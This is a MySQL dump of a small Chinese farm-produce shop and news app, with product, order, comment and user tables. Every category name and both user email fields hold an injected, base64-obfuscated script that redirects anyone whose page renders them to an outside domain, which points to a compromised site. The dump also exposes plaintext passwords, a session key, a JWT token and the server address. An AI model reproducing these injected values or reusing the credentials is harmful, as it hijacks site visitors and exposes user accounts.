CREATE DATABASE  IF NOT EXISTS `mydb_one` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `mydb_one`;
-- MySQL dump 10.13  Distrib 8.0.36, for Win64 (x86_64)
--
-- Host: 8.138.16.110    Database: mydb_one
-- ------------------------------------------------------
-- Server version	8.0.36

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `cart_items`
--

DROP TABLE IF EXISTS `cart_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `cart_items` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `user_id` bigint NOT NULL,
  `product_id` bigint NOT NULL,
  `quantity` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `cart_items_ibfk_2` (`product_id`),
  CONSTRAINT `cart_items_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cart_items`
--

LOCK TABLES `cart_items` WRITE;
/*!40000 ALTER TABLE `cart_items` DISABLE KEYS */;
INSERT INTO `cart_items` VALUES (2,1,2,2),(3,2,3,5),(4,2,4,1);
/*!40000 ALTER TABLE `cart_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `categories` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `parent_id` bigint DEFAULT NULL,
  `images` json DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  CONSTRAINT `categories_ibfk_1` FOREIGN KEY (`parent_id`) REFERENCES `categories` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES (1,'<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>',NULL,NULL),(2,'<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>',NULL,NULL),(3,'<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>',NULL,NULL),(4,'<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>',NULL,NULL),(5,'<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>',NULL,NULL);
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `comment`
--

DROP TABLE IF EXISTS `comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `comment` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `news_id` bigint NOT NULL,
  `content` text NOT NULL,
  `author` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `news_id` (`news_id`),
  CONSTRAINT `comment_ibfk_1` FOREIGN KEY (`news_id`) REFERENCES `news` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comment`
--

LOCK TABLES `comment` WRITE;
/*!40000 ALTER TABLE `comment` DISABLE KEYS */;
INSERT INTO `comment` VALUES (7,5,'This is a comment','Author1'),(8,6,'This is another comment','Author2'),(9,6,'1','微信用户'),(10,6,'2','微信用户'),(11,6,'3','微信用户');
/*!40000 ALTER TABLE `comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `news` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `type` varchar(50) NOT NULL,
  `imageUrls` json DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES (5,'新标题121','这是新闻内容2','single_image','[\"http://8.138.16.110/img/7a3da7a7-d7ef-425a-9fde-f51b2dbe3421.png\"]'),(6,'新闻标题3','这是新闻内容3','three_images','[\"http://8.138.16.110/img/xinwen2.jpg\", \"http://8.138.16.110/img/xinwen3.jpg\", \"http://8.138.16.110/img/xinwen4.jpg\"]'),(12,'哈哈哈哈','我是内容1','single_image','[\"http://8.138.16.110/img/73bd930f-a817-4a6c-9bf3-f9a0ae3c1c14.jpg\"]'),(13,'苹果','一天一个苹果','text',NULL);
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_items`
--

DROP TABLE IF EXISTS `order_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_items` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `order_id` bigint NOT NULL,
  `product_name` varchar(255) NOT NULL,
  `product_price` double NOT NULL,
  `product_quantity` int NOT NULL,
  `item_total` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_order_id` (`order_id`),
  CONSTRAINT `fk_order_id` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_items`
--

LOCK TABLES `order_items` WRITE;
/*!40000 ALTER TABLE `order_items` DISABLE KEYS */;
INSERT INTO `order_items` VALUES (1,1,'鸡肉',10,1,10);
/*!40000 ALTER TABLE `order_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `orders`
--

DROP TABLE IF EXISTS `orders`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `orders` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `user_id` varchar(255) NOT NULL,
  `order_date` varchar(255) NOT NULL,
  `total_amount` double NOT NULL,
  `user_name` varchar(255) NOT NULL,
  `address` varchar(255) NOT NULL,
  `phone` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `orders`
--

LOCK TABLES `orders` WRITE;
/*!40000 ALTER TABLE `orders` DISABLE KEYS */;
INSERT INTO `orders` VALUES (1,'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvLW13STdjTzk0ZFU5TVVuWUZFQ2xvTWVmalVRIiwiZXhwIjoxNzIxNjEyMTU4fQ.xbybVFhMRlaflRo_V1DnrWh22rx9nBTjUQE-6elPOUDxRwsiNzz_JAPNdq04qsRSzJ2yoiv0G8Con3QV-nDyBw','2024-07-13 14:45:53',10,'x','北京市 北京市 东城区 xxx','12345678910');
/*!40000 ALTER TABLE `orders` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `products` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `category_id` int DEFAULT NULL,
  `name` varchar(100) NOT NULL,
  `description` text,
  `price` decimal(10,2) NOT NULL,
  `images` json DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
INSERT INTO `products` VALUES (3,1,'鸡蛋','新鲜的鸡蛋',59.99,'[\"http://8.138.16.110/img/jidan1.jpg\", \"http://8.138.16.110/img/jidan2.jpg\", \"http://8.138.16.110/img/jidan3.jpg\"]','家禽'),(4,4,'鱼','新鲜的鱼',1.20,'[\"http://8.138.16.110/img/yu1.jpg\", \"http://8.138.16.110/img/yu2.jpg\", \"http://8.138.16.110/img/yu3.jpg\"]','水产品'),(5,4,'河虾','新鲜的河虾',2.50,'[\"http://8.138.16.110/img/hexia1.jpg\", \"http://8.138.16.110/img/hexia2.jpg\", \"http://8.138.16.110/img/hexia3.jpg\"]','水产品'),(6,4,'黄鳝','新鲜的黄鳝',25.00,'[\"http://8.138.16.110/img/huangshan1.jpg\", \"http://8.138.16.110/img/huangshan2.jpg\", \"http://8.138.16.110/img/huangshan3.jpg\"]','水产品'),(7,1,'鸭','新鲜的鸭',50.00,'[\"http://8.138.16.110/img/ya1.jpg\", \"http://8.138.16.110/img/ya2.jpg\", \"http://8.138.16.110/img/ya3.jpg\"]','家禽'),(8,5,'黄豆','新鲜的黄豆',10.00,'[\"http://8.138.16.110/img/huangdou1.jpg\", \"http://8.138.16.110/img/huangdou2.jpg\", \"http://8.138.16.110/img/huangdou3.jpg\"]','农作物'),(9,5,'花生','好吃的花生',6.00,'[\"http://8.138.16.110/img/huasheng1.jpg\", \"http://8.138.16.110/img/huasheng2.jpg\", \"http://8.138.16.110/img/huasheng3.jpg\"]','农作物'),(10,5,'玉米','甜甜的玉米',15.00,'[\"http://8.138.16.110/img/yumi1.jpg\", \"http://8.138.16.110/img/yumi2.jpg\", \"http://8.138.16.110/img/yumi3.jpg\"]','农作物'),(11,2,'龙眼','新鲜的龙眼',10.00,'[\"http://8.138.16.110/img/longyan1.jpg\", \"http://8.138.16.110/img/longyan2.jpg\", \"http://8.138.16.110/img/longyan3.jpg\"]','水果'),(12,2,'橘子','新鲜的橘子',10.00,'[\"http://8.138.16.110/img/juzi1.jpg\", \"http://8.138.16.110/img/juzi2.jpg\", \"http://8.138.16.110/img/juzi3.jpg\"]','水果'),(13,2,'甘蔗','新鲜的甘蔗',20.00,'[\"http://8.138.16.110/img/ganzhe1.jpg\", \"http://8.138.16.110/img/ganzhe2.jpg\", \"http://8.138.16.110/img/ganzhe3.jpg\"]','水果'),(14,2,'三华李','好吃又便宜',10.00,'[\"http://8.138.16.110/img/sanhua1.jpg\", \"http://8.138.16.110/img/sanhua2.jpg\", \"http://8.138.16.110/img/sanhua3.jpg\"]','水果'),(15,5,'水稻','粒粒分明',100.00,'[\"http://8.138.16.110/img/shuidao1.jpg\", \"http://8.138.16.110/img/shuidao2.jpg\", \"http://8.138.16.110/img/shuidao3.jpg\"]','农作物'),(16,NULL,'鸡','清远鸡',21.00,'[\"http://8.138.16.110/img/45ee115e-d261-4074-b712-0b02c654ccb8.jpg\"]','家禽'),(17,NULL,'猪','土猪',100.00,'[\"http://8.138.16.110/img/7f41edbd-b20b-44a7-bb8e-13e8234b6755.png\"]','家禽');
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `openid` varchar(255) NOT NULL,
  `session_key` varchar(255) NOT NULL,
  `nickname` varchar(255) DEFAULT NULL,
  `avatar_url` varchar(255) DEFAULT NULL,
  `gender` int DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `province` varchar(255) DEFAULT NULL,
  `country` varchar(255) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (1,'o-mwI7cO94dU9MUnYFECloMefjUQ','njZis0yYv9zsUIUFSRDVIg==','k',NULL,NULL,'','','','2024-07-08 01:06:50','2024-07-16 03:26:34');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'user1','password1','<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>'),(2,'user2','password2','<script>eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9pZTMzLmEwMDAxLm5ldCIp\"));</script>');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-07-16 12:08:28
